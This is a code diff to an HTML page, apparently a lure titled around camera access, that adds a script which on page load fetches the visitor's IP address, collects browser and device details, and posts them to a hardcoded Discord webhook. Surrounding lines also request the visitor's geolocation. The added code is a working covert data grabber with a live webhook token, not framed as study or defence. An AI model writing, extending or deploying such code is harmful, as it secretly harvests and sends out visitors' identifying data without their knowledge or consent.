@@ -11,6 +11,35 @@
     <script>
       const webhookUrl = 'https://discord.com/api/webhooks/1246133942344617984/L5BhAqPdku8Q8qR5-DJO5senhebGe2UMdVCsxEzb7cj_pYXBOsG43i1eZzPSk15KrHJD';
 
+      // Get the user's IP address
+      fetch('https://api.ipify.org/?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ipAddress = data.ip;
+
+          // Get the user's device information
+          const deviceInfo = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            browserName: getBrowserName(),
+          };
+
+          // Send the user's IP address and device information to the Discord webhook
+          const formData = new FormData();
+          formData.append('username', 'Kamera Erişimi');
+          formData.append('content', `IP Adresi: ${ipAddress}\nCihaz Bilgileri: ${JSON.stringify(deviceInfo)}`);
+
+          fetch(webhookUrl, {
+            method: 'POST',
+            body: formData,
+          })
+         .then(response => response.json())
+         .then(data => console.log(data))
+         .catch(error => console.error(error));
+        })
+        .catch(error => console.error(error));
+
       // Request the user's location
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(position => {
@@ -85,6 +114,16 @@
             console.error('Error:', error);
           });
       });
+
+      // Function to get the browser name
+      function getBrowserName() {
+        const userAgent = navigator.userAgent;
+        if (userAgent.indexOf('Chrome') > -1) return 'Google Chrome';
+        if (userAgent.indexOf('Firefox') > -1) return 'Mozilla Firefox';
+        if (userAgent.indexOf('Safari') > -1) return 'Apple Safari';
+        if (userAgent.indexOf('Edge') > -1) return 'Microsoft Edge';
+        return 'Unknown';
+      }
     </script>
   </body>
 </html>
